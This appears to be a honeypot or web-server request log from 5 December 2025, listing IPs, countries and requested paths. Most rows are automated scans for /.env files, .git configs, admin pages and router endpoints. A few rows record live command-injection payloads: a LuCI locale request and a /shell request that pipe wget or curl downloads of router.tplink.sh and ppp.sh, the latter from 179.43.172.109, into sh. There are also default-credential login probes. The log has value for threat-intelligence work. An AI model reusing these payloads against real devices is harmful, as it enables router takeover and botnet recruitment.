"2025-12-05","79.124.40.174","Bulgaria","HTTP","/actuator/gateway/routes"
"2025-12-05","15.204.142.151","United States","HTTP","/default.php"
"2025-12-05","15.204.142.151","United States","HTTP","/main.html"
"2025-12-05","15.204.142.151","United States","HTTP","/admin.cgi"
"2025-12-05","15.204.142.151","United States","HTTP","/base.shtml"
"2025-12-05","15.204.142.151","United States","HTTP","/home.cfm"
"2025-12-05","15.204.142.151","United States","HTTP","/start.cfm"
"2025-12-05","15.204.142.151","United States","HTTP","/admin.cfm"
"2025-12-05","15.204.142.151","United States","HTTP","/menu.cgi"
"2025-12-05","15.204.142.151","United States","HTTP","/base.pl"
"2025-12-05","15.204.142.151","United States","HTTP","/admin.aspx"
"2025-12-05","15.204.142.151","United States","HTTP","/indice.aspx"
"2025-12-05","15.204.142.151","United States","HTTP","/start.shtml"
"2025-12-05","15.204.142.151","United States","HTTP","/base.jhtml"
"2025-12-05","15.204.142.151","United States","HTTP","/main.html"
"2025-12-05","15.204.142.151","United States","HTTP","/default.cgi"
"2025-12-05","15.204.142.151","United States","HTTP","/base.shtml"
"2025-12-05","15.204.142.151","United States","HTTP","/inicio.html"
"2025-12-05","15.204.142.151","United States","HTTP","/start.cfm"
"2025-12-05","15.204.142.151","United States","HTTP","/default.cfm"
"2025-12-05","15.204.142.151","United States","HTTP","/start.pl"
"2025-12-05","15.204.142.151","United States","HTTP","/base.pl"
"2025-12-05","15.204.142.151","United States","HTTP","/base.jsp"
"2025-12-05","15.204.142.151","United States","HTTP","/indice.aspx"
"2025-12-05","15.204.142.151","United States","HTTP","/base.jhtml"
"2025-12-05","15.204.142.151","United States","HTTP","/localstart.cfm"
"2025-12-05","15.204.142.151","United States","HTTP","/default.cgi"
"2025-12-05","15.204.142.151","United States","HTTP","/menu.cfm"
"2025-12-05","15.204.142.151","United States","HTTP","/base.asp"
"2025-12-05","15.204.142.151","United States","HTTP","/inicio.html"
"2025-12-05","15.204.142.151","United States","HTTP","/default.cfm"
"2025-12-05","15.204.142.151","United States","HTTP","/base.php"
"2025-12-05","15.204.142.151","United States","HTTP","/localstart.cgi"
"2025-12-05","15.204.142.151","United States","HTTP","/start.pl"
"2025-12-05","15.204.142.151","United States","HTTP","/base.jsp"
"2025-12-05","15.204.142.151","United States","HTTP","/base.inc"
"2025-12-05","15.204.142.151","United States","HTTP","/indice.shtml"
"2025-12-05","15.204.142.151","United States","HTTP","/localstart.cfm"
"2025-12-05","15.204.142.151","United States","HTTP","/localstart.jhtml"
"2025-12-05","15.204.142.151","United States","HTTP","/menu.cfm"
"2025-12-05","15.204.142.151","United States","HTTP","/base.cgi"
"2025-12-05","15.204.142.151","United States","HTTP","/base.asp"
"2025-12-05","15.204.142.151","United States","HTTP","/base.php"
"2025-12-05","15.204.142.151","United States","HTTP","/base.cfm"
"2025-12-05","15.204.142.151","United States","HTTP","/default.html"
"2025-12-05","15.204.142.151","United States","HTTP","/localstart.cgi"
"2025-12-05","15.204.142.151","United States","HTTP","/main.cgi"
"2025-12-05","15.204.142.151","United States","HTTP","/base.inc"
"2025-12-05","15.204.142.151","United States","HTTP","/base.aspx"
"2025-12-05","15.204.142.151","United States","HTTP","/indice.shtml"
"2025-12-05","15.204.142.151","United States","HTTP","/base.jsa"
"2025-12-05","15.204.142.151","United States","HTTP","/localstart.jhtml"
"2025-12-05","15.204.142.151","United States","HTTP","/indice.pl"
"2025-12-05","15.204.142.151","United States","HTTP","/base.cgi"
"2025-12-05","15.204.142.151","United States","HTTP","/base.cfm"
"2025-12-05","15.204.142.151","United States","HTTP","/main.jsp"
"2025-12-05","15.204.142.151","United States","HTTP","/indice.php"
"2025-12-05","15.204.142.151","United States","HTTP","/default.html"
"2025-12-05","15.204.142.151","United States","HTTP","/main.cgi"
"2025-12-05","15.204.142.151","United States","HTTP","/main.asp"
"2025-12-05","15.204.142.151","United States","HTTP","/start.jsa"
"2025-12-05","15.204.142.151","United States","HTTP","/base.aspx"
"2025-12-05","15.204.142.151","United States","HTTP","/menu.jsa"
"2025-12-05","15.204.142.151","United States","HTTP","/base.jsa"
"2025-12-05","15.204.142.151","United States","HTTP","/indice.jsp"
"2025-12-05","15.204.142.151","United States","HTTP","/indice.pl"
"2025-12-05","15.204.142.151","United States","HTTP","/indice.jsa"
"2025-12-05","15.204.142.151","United States","HTTP","/main.jsp"
"2025-12-05","15.204.142.151","United States","HTTP","/indice.php"
"2025-12-05","15.204.142.151","United States","HTTP","/main.php"
"2025-12-05","15.204.142.151","United States","HTTP","/main.asp"
"2025-12-05","15.204.142.151","United States","HTTP","/home.aspx"
"2025-12-05","15.204.142.151","United States","HTTP","/menu.pl"
"2025-12-05","15.204.142.151","United States","HTTP","/start.jsa"
"2025-12-05","15.204.142.151","United States","HTTP","/index.cgi"
"2025-12-05","15.204.142.151","United States","HTTP","/menu.jsa"
"2025-12-05","15.204.142.151","United States","HTTP","/localstart.shtml"
"2025-12-05","15.204.142.151","United States","HTTP","/indice.jsp"
"2025-12-05","15.204.142.151","United States","HTTP","/inicio.jsa"
"2025-12-05","15.204.142.151","United States","HTTP","/indice.jsa"
"2025-12-05","15.204.142.151","United States","HTTP","/main.php"
"2025-12-05","15.204.142.151","United States","HTTP","/start.asp"
"2025-12-05","15.204.142.151","United States","HTTP","/indice.cgi"
"2025-12-05","15.204.142.151","United States","HTTP","/home.aspx"
"2025-12-05","15.204.142.151","United States","HTTP","/indice.asp"
"2025-12-05","15.204.142.151","United States","HTTP","/menu.pl"
"2025-12-05","15.204.142.151","United States","HTTP","/index.aspx"
"2025-12-05","15.204.142.151","United States","HTTP","/index.cgi"
"2025-12-05","15.204.142.151","United States","HTTP","/localstart.shtml"
"2025-12-05","15.204.142.151","United States","HTTP","/inicio.shtml"
"2025-12-05","15.204.142.151","United States","HTTP","/start.jsp"
"2025-12-05","15.204.142.151","United States","HTTP","/inicio.jsa"
"2025-12-05","15.204.142.151","United States","HTTP","/menu.shtml"
"2025-12-05","15.204.142.151","United States","HTTP","/start.asp"
"2025-12-05","15.204.142.151","United States","HTTP","/indice.cgi"
"2025-12-05","15.204.142.151","United States","HTTP","/default.jsp"
"2025-12-05","15.204.142.151","United States","HTTP","/indice.asp"
"2025-12-05","15.204.142.151","United States","HTTP","/default.jsa"
"2025-12-05","15.204.142.151","United States","HTTP","/main.aspx"
"2025-12-05","15.204.142.151","United States","HTTP","/index.aspx"
"2025-12-05","15.204.142.151","United States","HTTP","/indice.jhtml"
"2025-12-05","15.204.142.151","United States","HTTP","/inicio.shtml"
"2025-12-05","15.204.142.151","United States","HTTP","/localstart.jsp"
"2025-12-05","15.204.142.151","United States","HTTP","/start.jsp"
"2025-12-05","15.204.142.151","United States","HTTP","/menu.shtml"
"2025-12-05","15.204.142.151","United States","HTTP","/main.jhtml"
"2025-12-05","15.204.142.151","United States","HTTP","/main.shtml"
"2025-12-05","15.204.142.151","United States","HTTP","/default.jsp"
"2025-12-05","15.204.142.151","United States","HTTP","/menu.html"
"2025-12-05","15.204.142.151","United States","HTTP","/default.jsa"
"2025-12-05","15.204.142.151","United States","HTTP","/inicio.cgi"
"2025-12-05","15.204.142.151","United States","HTTP","/main.aspx"
"2025-12-05","15.204.142.151","United States","HTTP","/inicio.cfm"
"2025-12-05","15.204.142.151","United States","HTTP","/indice.jhtml"
"2025-12-05","15.204.142.151","United States","HTTP","/inicio.aspx"
"2025-12-05","15.204.142.151","United States","HTTP","/localstart.jsp"
"2025-12-05","15.204.142.151","United States","HTTP","/indice.html"
"2025-12-05","15.204.142.151","United States","HTTP","/main.jhtml"
"2025-12-05","15.204.142.151","United States","HTTP","/admin.pl"
"2025-12-05","15.204.142.151","United States","HTTP","/main.shtml"
"2025-12-05","15.204.142.151","United States","HTTP","/base.html"
"2025-12-05","15.204.142.151","United States","HTTP","/menu.html"
"2025-12-05","15.204.142.151","United States","HTTP","/inicio.cgi"
"2025-12-05","15.204.142.151","United States","HTTP","/menu.aspx"
"2025-12-05","15.204.142.151","United States","HTTP","/inicio.cfm"
"2025-12-05","15.204.142.151","United States","HTTP","/home.jsp"
"2025-12-05","15.204.142.151","United States","HTTP","/home.html"
"2025-12-05","15.204.142.151","United States","HTTP","/inicio.aspx"
"2025-12-05","15.204.142.151","United States","HTTP","/localstart.aspx"
"2025-12-05","15.204.142.151","United States","HTTP","/indice.html"
"2025-12-05","15.204.142.151","United States","HTTP","/localstart.html"
"2025-12-05","15.204.142.151","United States","HTTP","/admin.pl"
"2025-12-05","15.204.142.151","United States","HTTP","/base.html"
"2025-12-05","15.204.142.151","United States","HTTP","/home.asp"
"2025-12-05","15.204.142.151","United States","HTTP","/localstart.asp"
"2025-12-05","15.204.142.151","United States","HTTP","/menu.aspx"
"2025-12-05","15.204.142.151","United States","HTTP","/admin.asp"
"2025-12-05","15.204.142.151","United States","HTTP","/home.jsp"
"2025-12-05","15.204.142.151","United States","HTTP","/home.html"
"2025-12-05","15.204.142.151","United States","HTTP","/readme.txt"
"2025-12-05","15.204.142.151","United States","HTTP","/default.shtml"
"2025-12-05","15.204.142.151","United States","HTTP","/localstart.aspx"
"2025-12-05","15.204.142.151","United States","HTTP","/index.html"
"2025-12-05","15.204.142.151","United States","HTTP","/localstart.html"
"2025-12-05","15.204.142.151","United States","HTTP","/home.asp"
"2025-12-05","15.204.142.151","United States","HTTP","/inicio.pl"
"2025-12-05","15.204.142.151","United States","HTTP","/localstart.asp"
"2025-12-05","15.204.142.151","United States","HTTP","/main.cfm"
"2025-12-05","15.204.142.151","United States","HTTP","/admin.asp"
"2025-12-05","15.204.142.151","United States","HTTP","/start.cgi"
"2025-12-05","15.204.142.151","United States","HTTP","/default.pl"
"2025-12-05","15.204.142.151","United States","HTTP","/readme.txt"
"2025-12-05","15.204.142.151","United States","HTTP","/home.php"
"2025-12-05","15.204.142.151","United States","HTTP","/default.shtml"
"2025-12-05","15.204.142.151","United States","HTTP","/index.html"
"2025-12-05","15.204.142.151","United States","HTTP","/inicio.php"
"2025-12-05","15.204.142.151","United States","HTTP","/default.asp"
"2025-12-05","15.204.142.151","United States","HTTP","/inicio.pl"
"2025-12-05","15.204.142.151","United States","HTTP","/default.aspx"
"2025-12-05","15.204.142.151","United States","HTTP","/main.cfm"
"2025-12-05","15.204.142.151","United States","HTTP","/default.jhtml"
"2025-12-05","15.204.142.151","United States","HTTP","/start.cgi"
"2025-12-05","15.204.142.151","United States","HTTP","/default.pl"
"2025-12-05","15.204.142.151","United States","HTTP","/index.asp"
"2025-12-05","15.204.142.151","United States","HTTP","/inicio.jsp"
"2025-12-05","15.204.142.151","United States","HTTP","/home.php"
"2025-12-05","15.204.142.151","United States","HTTP","/menu.jhtml"
"2025-12-05","15.204.142.151","United States","HTTP","/inicio.php"
"2025-12-05","15.204.142.151","United States","HTTP","/index.shtml"
"2025-12-05","15.204.142.151","United States","HTTP","/default.asp"
"2025-12-05","15.204.142.151","United States","HTTP","/index.jsp"
"2025-12-05","15.204.142.151","United States","HTTP","/default.aspx"
"2025-12-05","15.204.142.151","United States","HTTP","/default.jhtml"
"2025-12-05","15.204.142.151","United States","HTTP","/home.cgi"
"2025-12-05","15.204.142.151","United States","HTTP","/index.asp"
"2025-12-05","15.204.142.151","United States","HTTP","/inicio.jsp"
"2025-12-05","15.204.142.151","United States","HTTP","/menu.jhtml"
"2025-12-05","15.204.142.151","United States","HTTP","/index.shtml"
"2025-12-05","15.204.142.151","United States","HTTP","/index.jsp"
"2025-12-05","15.204.142.151","United States","HTTP","/home.cgi"
"2025-12-05","95.214.52.170","Poland","HTTP","/login.asp"
"2025-12-05","193.142.147.209","Germany","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-12-05","45.38.44.221","United States","HTTP","/login"
"2025-12-05","176.65.149.48","The Netherlands","HTTP","http://httpbin.org/ip"
"2025-12-05","121.91.235.186","United States","HTTP","http://httpbin.org/ip"
"2025-12-05","176.65.148.251","The Netherlands","HTTP","/goform/set_LimitClient_cfg"
"2025-12-05","193.142.147.209","Germany","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-12-05","40.76.117.18","United States","HTTP","/portal/redlion"
"2025-12-05","207.90.244.14","United States","HTTP","/favicon.ico"
"2025-12-05","176.65.148.40","The Netherlands","HTTP","/goform/set_LimitClient_cfg"
"2025-12-05","80.94.95.98","Romania","HTTP","/.git/config"
"2025-12-05","121.91.235.186","United States","HTTP","http://httpbin.org/ip"
"2025-12-05","139.59.6.121","India","HTTP","/.env"
"2025-12-05","139.59.6.121","India","HTTP","/.git/config"
"2025-12-05","167.94.146.56","United States","HTTP","/robots.txt"
"2025-12-05","91.232.238.106","Ukraine","HTTP","/robots.txt"
"2025-12-05","176.65.148.40","The Netherlands","HTTP","/goform/set_LimitClient_cfg"
"2025-12-05","193.142.147.209","Germany","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-12-05","192.159.99.95","The Netherlands","HTTP","/tmUnblock.cgi"
"2025-12-05","192.159.99.95","The Netherlands","HTTP","/goform/set_LimitClient_cfg"
"2025-12-05","192.159.99.95","The Netherlands","HTTP","/goform/set_LimitClient_cfg"
"2025-12-05","3.148.219.221","United States","HTTP","/cgi-bin/authLogin.cgi"
"2025-12-05","176.65.148.40","The Netherlands","HTTP","/goform/set_LimitClient_cfg"
"2025-12-05","23.254.211.229","United States","HTTP","/.env"
"2025-12-05","193.142.147.209","Germany","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-12-05","162.142.125.37","United States","HTTP","/favicon.ico"
"2025-12-05","162.142.125.37","United States","HTTP","/sitemap.xml"
"2025-12-05","79.124.40.174","Bulgaria","HTTP","/?XDEBUG_SESSION_START=phpstorm"
"2025-12-05","193.142.147.209","Germany","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-12-05","79.124.40.174","Bulgaria","HTTP","/actuator/gateway/routes"
"2025-12-05","193.142.147.209","Germany","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-12-05","121.91.235.186","United States","HTTP","http://httpbin.org/ip"
"2025-12-05","221.159.119.6","South Korea","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh)"
"2025-12-05","221.159.119.6","South Korea","HTTP","/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh)"
"2025-12-05","107.170.51.201","United States","HTTP","/download/powershell/"
"2025-12-05","107.170.51.201","United States","HTTP","/get.php"
"2025-12-05","103.158.174.91","India","HTTP","/boaform/admin/formLogin?username=admin\u0026psd=admin"
"2025-12-05","45.226.112.204","Colombia","HTTP","/robots.txt"
"2025-12-05","64.62.197.83","United States","HTTP","/favicon.ico"
"2025-12-05","64.62.197.77","United States","HTTP","/geoserver/web/"
"2025-12-05","193.142.147.209","Germany","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-12-05","213.209.157.218","Germany","HTTP","/.git/config"
"2025-12-05","213.209.157.218","Germany","HTTP","/.env"
"2025-12-05","135.237.126.114","United States","HTTP","/hudson"
"2025-12-05","20.106.57.180","United States","HTTP","/actuator/health"
"2025-12-05","152.32.245.186","Thailand","HTTP","/favicon.ico"
"2025-12-05","152.32.245.186","Thailand","HTTP","/robots.txt"
"2025-12-05","152.32.245.186","Thailand","HTTP","/sitemap.xml"
"2025-12-05","78.153.140.203","United Kingdom","HTTP","/.env"
"2025-12-05","78.153.140.203","United Kingdom","HTTP","/test"
"2025-12-05","193.142.147.209","Germany","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-12-05","121.91.235.186","United States","HTTP","http://httpbin.org/ip"
"2025-12-05","45.38.44.221","United States","HTTP","/login"
"2025-12-05","176.65.148.40","The Netherlands","HTTP","/goform/set_LimitClient_cfg"
"2025-12-05","193.142.147.209","Germany","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-12-05","161.35.147.241","The Netherlands","HTTP","/form.html"
"2025-12-05","161.35.147.241","The Netherlands","HTTP","/upl.php"
"2025-12-05","161.35.147.241","The Netherlands","HTTP","/t4"
"2025-12-05","161.35.147.241","The Netherlands","HTTP","/geoip/"
"2025-12-05","161.35.147.241","The Netherlands","HTTP","/favicon.ico"
"2025-12-05","161.35.147.241","The Netherlands","HTTP","/1.php"
"2025-12-05","161.35.147.241","The Netherlands","HTTP","/systembc/password.php"
"2025-12-05","161.35.147.241","The Netherlands","HTTP","/password.php"
"2025-12-05","176.65.148.251","The Netherlands","HTTP","/goform/set_LimitClient_cfg"
"2025-12-05","193.142.147.209","Germany","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-12-05","134.199.146.133","Australia","HTTP","/.env"
"2025-12-05","134.199.146.133","Australia","HTTP","/.git/config"
"2025-12-05","91.232.238.112","Ukraine","HTTP","/admin/config.php"
"2025-12-05","91.232.238.112","Ukraine","HTTP","/robots.txt"
"2025-12-05","91.239.216.99","United States","HTTP","/ctrlt/DeviceUpgrade_1"
"2025-12-05","91.239.216.99","United States","HTTP","/index.html"
"2025-12-05","91.239.216.99","United States","HTTP","/status.html"
"2025-12-05","91.239.216.99","United States","HTTP","/cgi-bin/luci/admin/settings/gwinfo"
"2025-12-05","91.239.216.99","United States","HTTP","/index.html"
"2025-12-05","91.239.216.99","United States","HTTP","/status.html"
"2025-12-05","91.239.216.99","United States","HTTP","/cgi-bin/luci/api/v1/system/deviceinfo"
"2025-12-05","91.239.216.99","United States","HTTP","/index.html"
"2025-12-05","91.239.216.99","United States","HTTP","/status.html"
"2025-12-05","91.239.216.99","United States","HTTP","/cgi-bin/luci"
"2025-12-05","91.239.216.99","United States","HTTP","/index.html"
"2025-12-05","91.239.216.99","United States","HTTP","/status.html"
"2025-12-05","91.239.216.99","United States","HTTP","/ctrlt/DeviceUpgrade_1"
"2025-12-05","91.239.216.99","United States","HTTP","/index.html"
"2025-12-05","91.239.216.99","United States","HTTP","/status.html"
"2025-12-05","91.239.216.99","United States","HTTP","/cgi-bin/luci/admin/settings/gwinfo"
"2025-12-05","91.239.216.99","United States","HTTP","/index.html"
"2025-12-05","91.239.216.99","United States","HTTP","/status.html"
"2025-12-05","91.239.216.99","United States","HTTP","/cgi-bin/luci/api/v1/system/deviceinfo"
"2025-12-05","91.239.216.99","United States","HTTP","/index.html"
"2025-12-05","91.239.216.99","United States","HTTP","/status.html"
"2025-12-05","91.239.216.99","United States","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-12-05","91.239.216.99","United States","HTTP","/index.html"
"2025-12-05","91.239.216.99","United States","HTTP","/status.html"
"2025-12-05","91.239.216.99","United States","HTTP","/upnp/control/WANIPConnection"
"2025-12-05","91.239.216.99","United States","HTTP","/index.html"
"2025-12-05","91.239.216.99","United States","HTTP","/status.html"
"2025-12-05","91.239.216.99","United States","HTTP","/GponForm/diag_Form?images/"
"2025-12-05","91.239.216.99","United States","HTTP","/GponForm/diag_FORM?images/"
"2025-12-05","91.239.216.99","United States","HTTP","/manager_dev_ping_t.gch"
"2025-12-05","91.239.216.99","United States","HTTP","/web_shell_cmd.gch"
"2025-12-05","91.239.216.99","United States","HTTP","/web_shell_cmd.gch"
"2025-12-05","91.239.216.99","United States","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-12-05","91.239.216.99","United States","HTTP","/cgi-bin/luci/;stok=/locale?form=ping"
"2025-12-05","91.239.216.99","United States","HTTP","/cgi-bin/;sh"
"2025-12-05","91.239.216.99","United States","HTTP","/picsdesc.xml"
"2025-12-05","91.239.216.99","United States","HTTP","/cgi-bin/sysconf.cgi?cap=1"
"2025-12-05","91.239.216.99","United States","HTTP","/cgi-bin/;uname$IFS-a"
"2025-12-05","91.239.216.99","United States","HTTP","/diagnostic.php"
"2025-12-05","91.239.216.99","United States","HTTP","/login.cgi"
"2025-12-05","91.239.216.99","United States","HTTP","/HNAP1/"
"2025-12-05","91.239.216.99","United States","HTTP","/goform/setUsbUnload"
"2025-12-05","91.239.216.99","United States","HTTP","/goform/execCommand"
"2025-12-05","91.239.216.99","United States","HTTP","/Forms/rpSysAdmin_1"
"2025-12-05","91.239.216.99","United States","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-12-05","91.239.216.99","United States","HTTP","/shell?echo+j88%3B+%28wget+-O-+http%3A%2F%2F179.43.172.109%2Fppp.sh+%7C+sh+%7C%7C+curl+http%3A%2F%2F179.43.172.109%2Fppp.sh+%7C+sh%29+%26"
"2025-12-05","91.239.216.99","United States","HTTP","/apply.cgi"
"2025-12-05","91.239.216.99","United States","HTTP","/ctrlt/DeviceUpgrade_1"
"2025-12-05","91.239.216.99","United States","HTTP","/index.html"
"2025-12-05","91.239.216.99","United States","HTTP","/status.html"
"2025-12-05","91.239.216.99","United States","HTTP","/cgi-bin/luci/admin/settings/gwinfo"
"2025-12-05","91.239.216.99","United States","HTTP","/index.html"
"2025-12-05","91.239.216.99","United States","HTTP","/status.html"
"2025-12-05","91.239.216.99","United States","HTTP","/cgi-bin/luci/api/v1/system/deviceinfo"
"2025-12-05","91.239.216.99","United States","HTTP","/index.html"
"2025-12-05","91.239.216.99","United States","HTTP","/status.html"
"2025-12-05","91.239.216.99","United States","HTTP","/cgi-bin/luci"
"2025-12-05","91.239.216.99","United States","HTTP","/index.html"
"2025-12-05","91.239.216.99","United States","HTTP","/status.html"
"2025-12-05","91.239.216.99","United States","HTTP","/ctrlt/DeviceUpgrade_1"
"2025-12-05","91.239.216.99","United States","HTTP","/index.html"
"2025-12-05","91.239.216.99","United States","HTTP","/status.html"
"2025-12-05","91.239.216.99","United States","HTTP","/cgi-bin/luci/admin/settings/gwinfo"
"2025-12-05","91.239.216.99","United States","HTTP","/index.html"
"2025-12-05","91.239.216.99","United States","HTTP","/status.html"
"2025-12-05","91.239.216.99","United States","HTTP","/cgi-bin/luci/api/v1/system/deviceinfo"
"2025-12-05","91.239.216.99","United States","HTTP","/index.html"
"2025-12-05","91.239.216.99","United States","HTTP","/status.html"
"2025-12-05","91.239.216.99","United States","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-12-05","91.239.216.99","United States","HTTP","/index.html"
"2025-12-05","91.239.216.99","United States","HTTP","/status.html"
"2025-12-05","91.239.216.99","United States","HTTP","/upnp/control/WANIPConnection"
"2025-12-05","91.239.216.99","United States","HTTP","/index.html"
"2025-12-05","91.239.216.99","United States","HTTP","/status.html"
"2025-12-05","91.239.216.99","United States","HTTP","/GponForm/diag_Form?images/"
"2025-12-05","91.239.216.99","United States","HTTP","/GponForm/diag_FORM?images/"
"2025-12-05","91.239.216.99","United States","HTTP","/manager_dev_ping_t.gch"
"2025-12-05","91.239.216.99","United States","HTTP","/web_shell_cmd.gch"
"2025-12-05","91.239.216.99","United States","HTTP","/web_shell_cmd.gch"
"2025-12-05","91.239.216.99","United States","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-12-05","91.239.216.99","United States","HTTP","/cgi-bin/luci/;stok=/locale?form=ping"
"2025-12-05","91.239.216.99","United States","HTTP","/cgi-bin/;sh"
"2025-12-05","91.239.216.99","United States","HTTP","/picsdesc.xml"
"2025-12-05","91.239.216.99","United States","HTTP","/cgi-bin/sysconf.cgi?cap=1"
"2025-12-05","91.239.216.99","United States","HTTP","/cgi-bin/;uname$IFS-a"
"2025-12-05","91.239.216.99","United States","HTTP","/diagnostic.php"
"2025-12-05","91.239.216.99","United States","HTTP","/login.cgi"
"2025-12-05","91.239.216.99","United States","HTTP","/HNAP1/"
"2025-12-05","91.239.216.99","United States","HTTP","/goform/setUsbUnload"
"2025-12-05","91.239.216.99","United States","HTTP","/goform/execCommand"
"2025-12-05","91.239.216.99","United States","HTTP","/Forms/rpSysAdmin_1"
"2025-12-05","91.239.216.99","United States","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-12-05","91.239.216.99","United States","HTTP","/shell?echo+j88%3B+%28wget+-O-+http%3A%2F%2F179.43.172.109%2Fppp.sh+%7C+sh+%7C%7C+curl+http%3A%2F%2F179.43.172.109%2Fppp.sh+%7C+sh%29+%26"
"2025-12-05","91.239.216.99","United States","HTTP","/apply.cgi"
"2025-12-05","193.142.147.209","Germany","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-12-05","185.70.130.193","Russia","HTTP","/boaform/admin/formLogin?username=ec8\u0026psd=ec8"
"2025-12-05","82.223.30.60","Spain","HTTP","/admin/.env"
"2025-12-05","82.223.30.60","Spain","HTTP","/.env.production"
"2025-12-05","82.223.30.60","Spain","HTTP","/api/.env"
"2025-12-05","82.223.30.60","Spain","HTTP","/.env"
"2025-12-05","82.223.30.60","Spain","HTTP","/config/.env"
"2025-12-05","82.223.30.60","Spain","HTTP","/laravel/.env"
"2025-12-05","82.223.30.60","Spain","HTTP","/backend/.env"
"2025-12-05","82.223.30.60","Spain","HTTP","/app/.env"
"2025-12-05","82.223.30.60","Spain","HTTP","/frontend/.env"
"2025-12-05","82.223.30.60","Spain","HTTP","/.env.development"
"2025-12-05","82.223.30.60","Spain","HTTP","/html/.env"
"2025-12-05","82.223.30.60","Spain","HTTP","/public/.env"
"2025-12-05","82.223.30.60","Spain","HTTP","/.env.local"
"2025-12-05","82.223.30.60","Spain","HTTP","/www/.env"
"2025-12-05","193.142.147.209","Germany","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-12-05","193.142.147.209","Germany","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-12-05","193.142.147.209","Germany","HTTP","/cgi-bin/luci/;stok=/locale"
"2025-12-05","192.159.99.95","The Netherlands","HTTP","/cgi-bin/vitogate.cgi"
